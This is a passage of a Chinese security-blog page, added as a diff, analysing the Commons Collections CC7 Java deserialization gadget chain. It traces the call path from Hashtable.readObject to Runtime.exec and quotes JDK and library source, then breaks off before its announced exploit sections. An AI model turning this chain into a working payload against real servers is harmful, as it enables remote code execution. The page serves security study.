@@ -1,0 +1,423 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  java反序列化之CC7
+  #
+
+
+  CC7 链分析
+  #
+
+CC7 的后半段链子和 CC1 是一样的，前半段先看一下 yso 的链子：
+java.util.Hashtable.readObject
+java.util.Hashtable.reconstitutionPut
+org.apache.commons.collections.map.AbstractMapDecorator.equals
+java.util.AbstractMap.equals
+org.apache.commons.collections.map.LazyMap.get
+org.apache.commons.collections.functors.ChainedTransformer.transform
+org.apache.commons.collections.functors.InvokerTransformer.transform
+java.lang.reflect.Method.invoke
+sun.reflect.DelegatingMethodAccessorImpl.invoke
+sun.reflect.NativeMethodAccessorImpl.invoke
+sun.reflect.NativeMethodAccessorImpl.invoke0
+java.lang.Runtime.exec
+入口类是Hashtable，看一下readObject方法的源码：
+private void readObject(java.io.ObjectInputStream s)
+         throws IOException, ClassNotFoundException
+    {
+        // Read in the length, threshold, and loadfactor
+        s.defaultReadObject();
+
+        // Read the original length of the array and number of elements
+        int origlength = s.readInt();
+        int elements = s.readInt();
+
+        // Compute new size with a bit of room 5% to grow but
+        // no larger than the original size.  Make the length
+        // odd if it&#39;s large enough, this helps distribute the entries.
+        // Guard against the length ending up zero, that&#39;s not valid.
+        int length = (int)(elements * loadFactor) + (elements / 20) + 3;
+        if (length > elements && (length & 1) == 0)
+            length--;
+        if (origlength > 0 && length > origlength)
+            length = origlength;
+        table = new Entry<?,?>[length];
+        threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);
+        count = 0;
+
+        // Read the number of elements and then all the key/value objects
+        for (; elements > 0; elements--) {
+            @SuppressWarnings("unchecked")
+                K key = (K)s.readObject();
+            @SuppressWarnings("unchecked")
+                V value = (V)s.readObject();
+            // synch could be eliminated for performance
+            reconstitutionPut(table, key, value);
+        }
+    }
+在最后调用了Hashtable.reconstitutionPut()方法，跟进一下：'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="java反序列化之CC7"><meta property="og:description" content='java反序列化之CC7 # CC7 链分析 # CC7 的后半段链子和 CC1 是一样的，前半段先看一下 yso 的链子：
+java.util.Hashtable.readObject java.util.Hashtable.reconstitutionPut org.apache.commons.collections.map.AbstractMapDecorator.equals java.util.AbstractMap.equals org.apache.commons.collections.map.LazyMap.get org.apache.commons.collections.functors.ChainedTransformer.transform org.apache.commons.collections.functors.InvokerTransformer.transform java.lang.reflect.Method.invoke sun.reflect.DelegatingMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke sun.reflect.NativeMethodAccessorImpl.invoke0 java.lang.Runtime.exec 入口类是Hashtable，看一下readObject方法的源码：
+private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the length, threshold, and loadfactor s.defaultReadObject(); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Compute new size with a bit of room 5% to grow but // no larger than the original size. Make the length // odd if it&#39;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that&#39;s not valid. int length = (int)(elements * loadFactor) + (elements / 20) + 3; if (length > elements && (length & 1) == 0) length--; if (origlength > 0 && length > origlength) length = origlength; table = new Entry<?,?>[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements > 0; elements--) { @SuppressWarnings("unchecked") K key = (K)s.readObject(); @SuppressWarnings("unchecked") V value = (V)s.readObject(); // synch could be eliminated for performance reconstitutionPut(table, key, value); } } 在最后调用了Hashtable.reconstitutionPut()方法，跟进一下：'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-05-20T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-20T00:00:00+00:00"><meta property="article:tag" content="Java安全"><meta property="article:tag" content="反序列化专题"><meta property="article:tag" content="CC链"><title>java反序列化之CC7 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle checked>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/ class=active>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>java反序列化之CC7</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#cc7-链分析>CC7 链分析</a></li><li><a href=#cc7-exp>CC7 EXP</a><ul><li><a href=#lazymapget-部分的-exp>LazyMap.get() 部分的 EXP</a></li><li><a href=#结合入口类编写-exp>结合入口类编写 EXP</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java反序列化之cc7>java反序列化之CC7
+<a class=anchor href=#java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bcc7>#</a></h1><h2 id=cc7-链分析>CC7 链分析
+<a class=anchor href=#cc7-%e9%93%be%e5%88%86%e6%9e%90>#</a></h2><p>CC7 的后半段链子和 CC1 是一样的，前半段先看一下 yso 的链子：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-text data-lang=text><span style=display:flex><span>java.util.Hashtable.readObject
+</span></span><span style=display:flex><span>java.util.Hashtable.reconstitutionPut
+</span></span><span style=display:flex><span>org.apache.commons.collections.map.AbstractMapDecorator.equals
+</span></span><span style=display:flex><span>java.util.AbstractMap.equals
+</span></span><span style=display:flex><span>org.apache.commons.collections.map.LazyMap.get
+</span></span><span style=display:flex><span>org.apache.commons.collections.functors.ChainedTransformer.transform
+</span></span><span style=display:flex><span>org.apache.commons.collections.functors.InvokerTransformer.transform
+</span></span><span style=display:flex><span>java.lang.reflect.Method.invoke
+</span></span><span style=display:flex><span>sun.reflect.DelegatingMethodAccessorImpl.invoke
+</span></span><span style=display:flex><span>sun.reflect.NativeMethodAccessorImpl.invoke
+</span></span><span style=display:flex><span>sun.reflect.NativeMethodAccessorImpl.invoke0
+</span></span><span style=display:flex><span>java.lang.Runtime.exec
+</span></span></code></pre></div><p>入口类是<code>Hashtable</code>，看一下<code>readObject</code>方法的源码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
+</span></span><span style=display:flex><span>         <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read in the length, threshold, and loadfactor</span>
+</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>defaultReadObject</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read the original length of the array and number of elements</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> origlength <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readInt</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> elements <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readInt</span>();
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Compute new size with a bit of room 5% to grow but</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// no larger than the original size.  Make the length</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// odd if it&#39;s large enough, this helps distribute the entries.</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Guard against the length ending up zero, that&#39;s not valid.</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> length <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)(elements <span style=color:#f92672>*</span> loadFactor) <span style=color:#f92672>+</span> (elements <span style=color:#f92672>/</span> 20) <span style=color:#f92672>+</span> 3;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (length <span style=color:#f92672>&gt;</span> elements <span style=color:#f92672>&amp;&amp;</span> (length <span style=color:#f92672>&amp;</span> 1) <span style=color:#f92672>==</span> 0)
+</span></span><span style=display:flex><span>            length<span style=color:#f92672>--</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (origlength <span style=color:#f92672>&gt;</span> 0 <span style=color:#f92672>&amp;&amp;</span> length <span style=color:#f92672>&gt;</span> origlength)
+</span></span><span style=display:flex><span>            length <span style=color:#f92672>=</span> origlength;
+</span></span><span style=display:flex><span>        table <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;[</span>length<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>        threshold <span style=color:#f92672>=</span> (<span style=color:#66d9ef>int</span>)Math.<span style=color:#a6e22e>min</span>(length <span style=color:#f92672>*</span> loadFactor, MAX_ARRAY_SIZE <span style=color:#f92672>+</span> 1);
+</span></span><span style=display:flex><span>        count <span style=color:#f92672>=</span> 0;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Read the number of elements and then all the key/value objects</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (; elements <span style=color:#f92672>&gt;</span> 0; elements<span style=color:#f92672>--</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>                K key <span style=color:#f92672>=</span> (K)s.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>                V value <span style=color:#f92672>=</span> (V)s.<span style=color:#a6e22e>readObject</span>();
+</span></span><span style=display:flex><span>            <span style=color:#75715e>// synch could be eliminated for performance</span>
+</span></span><span style=display:flex><span>            reconstitutionPut(table, key, value);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>在最后调用了<code>Hashtable.reconstitutionPut()</code>方法，跟进一下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>reconstitutionPut</span>(Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;[]</span> tab, K key, V value)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> StreamCorruptedException
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Makes sure the key is not already in the hashtable.</span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// This should not happen in deserialized version.</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> hash <span style=color:#f92672>=</span> key.<span style=color:#a6e22e>hashCode</span>();
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> index <span style=color:#f92672>=</span> (hash <span style=color:#f92672>&amp;</span> 0x7FFFFFFF) <span style=color:#f92672>%</span> tab.<span style=color:#a6e22e>length</span>;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (Entry<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> e <span style=color:#f92672>=</span> tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> ; e <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> ; e <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>next</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> ((e.<span style=color:#a6e22e>hash</span> <span style=color:#f92672>==</span> hash) <span style=color:#f92672>&amp;&amp;</span> e.<span style=color:#a6e22e>key</span>.<span style=color:#a6e22e>equals</span>(key)) {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>StreamCorruptedException</span>();
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// Creates the new entry.</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
+</span></span><span style=display:flex><span>        Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> (Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span>)tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span>;
+</span></span><span style=display:flex><span>        tab<span style=color:#f92672>[</span>index<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Entry<span style=color:#f92672>&lt;&gt;</span>(hash, key, value, e);
+</span></span><span style=display:flex><span>        count<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>根据 yso 的链子就找到了<code>equals()</code>方法，不过也能走<code>hashCode()</code>方法，这就回到 CC6 了。然后找到<code>AbstractMapDecorator</code>这个类的<code>equals()</code>方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(Object object) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (object <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> map.<span style=color:#a6e22e>equals</span>(object);
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>再来看一下构造器：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>transient</span> Map map
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#a6e22e>AbstractMapDecorator</span>(Map map) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (map <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IllegalArgumentException(<span style=color:#e6db74>&#34;Map must not be null&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>map</span> <span style=color:#f92672>=</span> map;
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>接下来就是找 Map 的实现类。在<code>AbstractMap</code>类的<code>equals()</code> 方法中发现其调用了 <code>get()</code> 方法：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>equals</span>(Object o) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (o <span style=color:#f92672>==</span> <span style=color:#66d9ef>this</span>)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(o <span style=color:#66d9ef>instanceof</span> Map))
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span> m <span style=color:#f92672>=</span> (Map<span style=color:#f92672>&lt;?</span>,<span style=color:#f92672>?&gt;</span>) o;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (m.<span style=color:#a6e22e>size</span>() <span style=color:#f92672>!=</span> size())
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
+</span></span><span style=display:flex><span>            Iterator<span style=color:#f92672>&lt;</span>Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;&gt;</span> i <span style=color:#f92672>=</span> entrySet().<span style=color:#a6e22e>iterator</span>();
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> (i.<span style=color:#a6e22e>hasNext</span>()) {
+</span></span><span style=display:flex><span>                Entry<span style=color:#f92672>&lt;</span>K,V<span style=color:#f92672>&gt;</span> e <span style=color:#f92672>=</span> i.<span style=color:#a6e22e>next</span>();
+</span></span><span style=display:flex><span>                K key <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getKey</span>();
+</span></span><span style=display:flex><span>                V value <span style=color:#f92672>=</span> e.<span style=color:#a6e22e>getValue</span>();
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (value <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(m.<span style=color:#a6e22e>get</span>(key)<span style=color:#f92672>==</span><span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> m.<span style=color:#a6e22e>containsKey</span>(key)))
